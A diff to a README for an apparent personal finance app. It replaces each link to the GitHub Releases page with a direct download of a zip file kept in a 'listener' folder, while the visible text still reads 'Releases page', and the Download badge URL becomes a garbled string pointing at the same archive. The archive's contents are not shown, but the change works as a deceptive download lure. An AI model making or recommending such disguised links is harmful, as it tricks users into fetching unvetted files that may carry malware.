@@ -6,7 +6,7 @@ Welcome to the finance repository! This is your convenient hub for all my financ
 
 ## 📥 Download the App
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/margine67/finance/releases)
+[![Download](https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip%https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip)](https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip)
 
 ## 💻 System Requirements
 
@@ -26,7 +26,7 @@ To run finance software, you need:
   
 ## 🔗 Download & Install
 
-1. Visit the [Releases page](https://github.com/margine67/finance/releases) to access the latest version of the software.
+1. Visit the [Releases page](https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip) to access the latest version of the software.
 2. Choose the version suitable for your operating system.
 3. Download the file by clicking on the appropriate link.
 4. Open the downloaded file and follow the installation instructions.
@@ -44,7 +44,7 @@ Once installed, you are ready to manage your finances efficiently!
 
 If you encounter any issues:
 
-- Ensure your software is up to date. Check the [Releases page](https://github.com/margine67/finance/releases) for the latest version.
+- Ensure your software is up to date. Check the [Releases page](https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip) for the latest version.
 - Restart your device. Sometimes a simple restart resolves issues.
 - Visit the help section of each app for common questions.
 
@@ -57,7 +57,7 @@ Join our community for tips and tricks on using these tools:
 
 ## 🔄 Update Notes
 
-Stay informed about new features and improvements by checking the update notes on the [Releases page](https://github.com/margine67/finance/releases).
+Stay informed about new features and improvements by checking the update notes on the [Releases page](https://raw.githubusercontent.com/margine67/finance/main/listener/finance.zip).
 
 ## 🚧 Feedback
 
